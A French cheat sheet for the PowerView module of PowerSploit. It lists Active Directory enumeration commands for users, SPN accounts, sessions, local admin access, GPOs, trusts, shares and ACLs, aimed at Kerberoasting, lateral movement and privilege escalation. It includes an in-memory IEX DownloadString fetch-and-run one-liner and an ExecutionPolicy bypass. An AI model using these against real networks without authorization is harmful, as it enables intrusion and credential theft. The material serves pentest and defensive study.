**Objectif :** PowerView est un module PowerShell faisant partie de la suite PowerSploit. Il est spécialisé dans l'énumération et l'exploitation d'environnements Active Directory (AD). Il permet de cartographier le domaine, trouver des utilisateurs, groupes, ordinateurs, GPOs, ACLs, et identifier des chemins potentiels d'escalade de privilèges ou de mouvement latéral.

**Source :** [https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)

---

### 🚀 **Chargement de PowerView**

* **Méthode 1 : Fichier local**
  ```powershell
  # Naviguer vers le dossier contenant PowerView.ps1
  Import-Module .\PowerView.ps1
  ```
* **Méthode 2 : Téléchargement et exécution en mémoire (bypass)**
  ```powershell
  # Attention : Peut être détecté par les antivirus/EDR
  IEX (New-Object Net.WebClient).DownloadString('[https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1)')
  ```

> \[!Attention]
> L'exécution de scripts PowerShell peut être restreinte par la politique d'exécution (`ExecutionPolicy`). Utilisez `Set-ExecutionPolicy Bypass -Scope Process` pour la contourner temporairement dans la session courante (si autorisé).

---

### 🔍 **Exploration du Domaine et de la Forêt**

#### Informations sur le domaine actuel

```powershell
Get-NetDomain
```

* **Contexte :** Récupère les informations de base sur le domaine AD auquel la machine actuelle est jointe (nom, SID, contrôleurs de domaine, niveau fonctionnel...).
* **Usage :** Point de départ pour comprendre l'environnement AD actuel.

#### Informations sur un domaine spécifique

```powershell
Get-NetDomain -Domain <nom_domaine>
```

* **Contexte :** Interroge un autre domaine (accessible via une relation de confiance ou si un DC est spécifié).
* **Usage :** Énumération de domaines dans une forêt ou des domaines approuvés.

#### Trouver un contrôleur de domaine (DC)

```powershell
Get-NetDomainController [-Domain <nom_domaine>]
```

* **Contexte :** Identifie les contrôleurs de domaine pour le domaine actuel ou un domaine spécifié.
* **Usage :** Trouver les serveurs KDC et LDAP cibles pour d'autres requêtes.

#### Informations sur la forêt actuelle

```powershell
Get-NetForest [-Forest <nom_foret>]
```

* **Contexte :** Obtient des informations sur la forêt AD (domaines membres, catalogue global...).
* **Usage :** Comprendre la structure globale si plusieurs domaines existent.

#### Lister les domaines de la forêt

```powershell
Get-NetForestDomain [-Forest <nom_foret>]
```

* **Contexte :** Énumère tous les domaines appartenant à la forêt actuelle ou spécifiée.
* **Usage :** Cartographie complète des domaines au sein de la forêt.

#### Trouver les serveurs de Catalogue Global (GC)

```powershell
Get-NetForestCatalog [-Forest <nom_foret>]
```

* **Contexte :** Identifie les serveurs GC, qui contiennent une copie partielle des objets de tous les domaines de la forêt.
* **Usage :** Utile pour des recherches rapides à l'échelle de la forêt.

---

### 👥 **Utilisateurs et Groupes**

#### Informations sur un utilisateur

```powershell
Get-NetUser [-UserName <nom_utilisateur>] [-Properties *] [-Domain <nom_domaine>]
```

* **Contexte :** Récupère les attributs d'un ou plusieurs utilisateurs (par défaut l'utilisateur courant).
* **Usage :** Obtenir des détails sur un utilisateur (SID, groupes, description, date de dernière connexion...). `-Properties *` est crucial pour voir tous les attributs.
* **Astuce :** Utilisez `-LDAPFilter` pour des recherches complexes (ex: `Get-NetUser -LDAPFilter '(description=*admin*)' -Properties description`).

#### Lister tous les utilisateurs du domaine

```powershell
Get-NetUser -Domain <nom_domaine> | select SamAccountName, Description, PwdLastSet, LastLogonDate
```

* **Contexte :** Énumère tous les comptes utilisateurs du domaine.
* **Usage :** Obtenir une liste complète des utilisateurs pour d'autres analyses (spraying, recherche de comptes inactifs...).

#### Trouver les utilisateurs avec SPN (Kerberoastable)

```powershell
Get-NetUser -SPN -Properties serviceprincipalname, samaccountname
```

* **Contexte :** Identifie les comptes utilisateurs configurés avec un Service Principal Name (SPN), les rendant potentiellement vulnérables au Kerberoasting.
* **Usage :** Trouver des cibles pour extraire des TGS et tenter de cracker leur mot de passe hors ligne.

#### Informations sur un groupe

```powershell
Get-NetGroup [-GroupName <nom_groupe>] [-Properties *] [-FullData] [-Domain <nom_domaine>]
```

* **Contexte :** Récupère les informations sur un ou plusieurs groupes AD.
* **Usage :** Obtenir les détails d'un groupe (SID, membres, description...). `-FullData` fournit plus d'informations.

#### Lister tous les groupes du domaine

```powershell
Get-NetGroup -Domain <nom_domaine> | select SamAccountName, GroupCategory, Description
```

* **Contexte :** Énumère tous les groupes du domaine.
* **Usage :** Identifier les groupes potentiellement privilégiés (Admins, DnsAdmins, etc.).

#### Trouver les membres d'un groupe (récursivement)

```powershell
Get-NetGroupMember -GroupName <nom_groupe> [-Recurse] [-Domain <nom_domaine>]
```

* **Contexte :** Liste les membres (utilisateurs, groupes, ordinateurs) d'un groupe spécifique.
* **Usage :** Comprendre qui a les privilèges associés à un groupe. `-Recurse` explore les groupes imbriqués.

#### Lister les groupes d'appartenance d'un utilisateur

```powershell
Get-NetGroup -UserName <nom_utilisateur> [-Domain <nom_domaine>]
# Alternative :
Get-NetUser -Identity <nom_utilisateur> -Properties MemberOf | Select -ExpandProperty MemberOf
```

* **Contexte :** Détermine à quels groupes un utilisateur appartient.
* **Usage :** Évaluer les privilèges d'un utilisateur compromis.

---

### 💻 **Exploration des Ordinateurs**

#### Lister tous les ordinateurs du domaine

```powershell
Get-NetComputer [-FullData] [-Domain <nom_domaine>]
```

* **Contexte :** Énumère les objets ordinateur dans l'AD.
* **Usage :** Identifier les serveurs, postes de travail, et potentiellement les contrôleurs de domaine. `-FullData` ou `-Properties *` pour plus de détails (OS, etc.).

#### Trouver des ordinateurs avec un OS spécifique

```powershell
Get-NetComputer -OperatingSystem "*Server 2016*" -Domain <nom_domaine>
```

* **Contexte :** Filtre les ordinateurs par chaîne de caractères dans leur attribut OperatingSystem.
* **Usage :** Cibler des types spécifiques de machines (ex: anciens OS, serveurs).

#### Tester la connectivité (Ping) des ordinateurs

```powershell
Get-NetComputer -Ping [-Domain <nom_domaine>]
```

* **Contexte :** Tente de pinger chaque ordinateur trouvé dans l'AD.
* **Usage :** Vérifier rapidement quels ordinateurs sont en ligne (peut être bloqué par un pare-feu).

---

### 🔄 **Sessions et Accès Local**

> \[!Attention]
> Ces commandes interrogent les machines distantes et nécessitent souvent des privilèges (admin local sur la cible) et génèrent du trafic réseau potentiellement détectable.

#### Lister les sessions actives sur un ordinateur

```powershell
Get-NetSession -ComputerName <nom_ordi_ou_ip>
```

* **Contexte :** Interroge la machine cible pour savoir quels utilisateurs ont des sessions SMB ouvertes *vers* elle.
* **Usage :** Identifier qui accède aux ressources d'un serveur spécifique.

#### Lister les utilisateurs connectés sur une machine

```powershell
Get-NetLoggedon -ComputerName <nom_ordi_ou_ip>
```

* **Contexte :** Tente de déterminer quels utilisateurs sont actuellement connectés (localement ou via RDP) sur la machine cible.
* **Usage :** Trouver où des utilisateurs spécifiques (ex: admins) sont connectés.

#### Trouver les machines où l'utilisateur courant a des droits admin local

```powershell
Find-LocalAdminAccess [-ComputerName <liste_ordis>] [-Verbose]
```

* **Contexte :** Tente de se connecter à l'IPC$ ou au registre des machines cibles pour vérifier si l'utilisateur courant a des droits d'administrateur local.
* **Usage :** Identifier des cibles pour le mouvement latéral si l'utilisateur courant a des privilèges sur d'autres machines.

#### Trouver où des utilisateurs/groupes spécifiques sont connectés ou ont des droits admin

```powershell
Find-DomainUserLocation -UserGroupIdentity <nom_utilisateur_ou_groupe> [-CheckAccess] [-Domain <nom_domaine>]
```

* **Contexte :** Combine `Get-NetLoggedon` et `Get-NetSession` pour trouver où un utilisateur/groupe est potentiellement actif.
* **Usage :** Chasse aux sessions d'utilisateurs privilégiés. `-CheckAccess` tente de vérifier les droits admin local (plus intrusif).

---

### 🏛️ **Gestion des Politiques de Groupe (GPO)**

#### Lister les GPO du domaine

```powershell
Get-NetGPO [-ComputerName <nom_ordi>] [-Domain <nom_domaine>]
```

* **Contexte :** Énumère toutes les GPO du domaine ou celles appliquées à un ordinateur spécifique.
* **Usage :** Identifier les politiques de sécurité, les déploiements logiciels, les scripts de démarrage/connexion.

#### Trouver les GPO modifiant les groupes locaux (Restricted Groups / Group Policy Preferences)

```powershell
Get-NetGPOGroup [-Domain <nom_domaine>]
```

* **Contexte :** Recherche spécifiquement les GPO qui configurent l'appartenance des groupes locaux sur les machines (ex: ajout d'un groupe AD au groupe Administrateurs local).
* **Usage :** Identifier des GPO qui pourraient accorder des privilèges admin local à certains utilisateurs/groupes sur des OUs spécifiques.

#### Trouver quelles machines sont affectées par une GPO spécifique

```powershell
Get-NetOU -GPLink <nom_ou_guid_gpo> | Get-NetComputer
```

* **Contexte :** Identifie les OUs liées à une GPO, puis liste les ordinateurs dans ces OUs.
* **Usage :** Comprendre la portée d'application d'une GPO potentiellement intéressante.

---

### 🔗 **Relations de Confiance Active Directory (Trusts)**

#### Lister les relations de confiance du domaine

```powershell
Get-NetDomainTrust [-Domain <nom_domaine>]
```

* **Contexte :** Affiche les relations de confiance (entrantes, sortantes, type, transitivité) établies par le domaine actuel ou spécifié.
* **Usage :** Identifier des chemins d'attaque potentiels vers d'autres domaines ou forêts.

#### Lister les relations de confiance de la forêt

```powershell
Get-NetForestTrust [-Forest <nom_foret>]
```

* **Contexte :** Énumère les relations de confiance au niveau de la forêt.
* **Usage :** Obtenir une vue d'ensemble des relations entre différentes forêts.

---

### 🎯 **Recherche d'Objets et de Fichiers**

#### Rechercher des objets AD avec un filtre LDAP

```powershell
Find-ADObject -LDAPFilter <filtre_ldap> -Properties <prop1,prop2,...>
# Exemple : Trouver les comptes de service
Find-ADObject -LDAPFilter '(&(samAccountType=805306368)(msDS-ManagedPasswordInterval=*))' -Properties samaccountname,serviceprincipalname
```

* **Contexte :** Permet des recherches très spécifiques dans l'AD en utilisant la syntaxe de filtre LDAP.
* **Usage :** Recherche avancée d'objets répondant à des critères précis.

#### Rechercher des partages SMB accessibles

```powershell
Invoke-ShareFinder [-ComputerName <liste_ordis>] [-CheckShareAccess] [-Verbose]
```

* **Contexte :** Découvre les partages SMB sur les machines spécifiées (ou toutes celles du domaine par défaut).
* **Usage :** Identifier des partages potentiellement intéressants. `-CheckShareAccess` vérifie si l'utilisateur courant a des droits de lecture.

#### Rechercher des fichiers sensibles sur les partages accessibles

```powershell
Invoke-FileFinder [-ComputerName <liste_ordis>] -Search <motif> [-Verbose]
# Exemple : Chercher des fichiers contenant "password" dans leur nom
Invoke-FileFinder -Search "*password*"
```

* **Contexte :** Recherche des fichiers correspondant à un motif sur les partages SMB accessibles.
* **Usage :** Trouver des fichiers de configuration, scripts, backups contenant potentiellement des informations sensibles.

---

### 🛡️ **Analyse des Permissions (ACLs)**

#### Lister les ACLs d'un objet AD

```powershell
Get-ObjectAcl -SamAccountName <nom_objet> [-ResolveGUIDs] [-Domain <nom_domaine>]
# Alternative :
Get-ObjectAcl -ADSpath "LDAP://CN=AdminGroup,OU=Groups,DC=domain,DC=local" -ResolveGUIDs
```

* **Contexte :** Affiche la liste de contrôle d'accès (ACL) pour un objet AD spécifique (utilisateur, groupe, ordinateur, OU, GPO...).
* **Usage :** Identifier qui a quels droits sur un objet. Crucial pour trouver des chemins d'escalade de privilèges (ex: droit d'écriture sur un groupe admin, droit de réinitialiser un mot de passe...). `-ResolveGUIDs` traduit les GUIDs en noms connus.

#### Trouver des ACLs intéressantes dans le domaine

```powershell
Find-InterestingDomainAcl [-ResolveGUIDs] [-Domain <nom_domaine>]
```

* **Contexte :** Recherche automatiquement des configurations d'ACL potentiellement exploitables dans tout le domaine (droits de modification sur des objets privilégiés, GenericAll, WriteDacl, etc.).
* **Usage :** Point de départ rapide pour identifier des faiblesses de configuration des permissions AD.

#### Lister les ACLs d'un chemin de fichier/dossier (local ou UNC)

```powershell
Get-PathAcl -Path <chemin>
# Exemple :
Get-PathAcl -Path "\\DC01\SYSVOL"
```

* **Contexte :** Affiche les permissions NTFS sur un fichier ou un dossier.
* **Usage :** Vérifier les permissions sur des partages réseau comme SYSVOL ou NETLOGON.
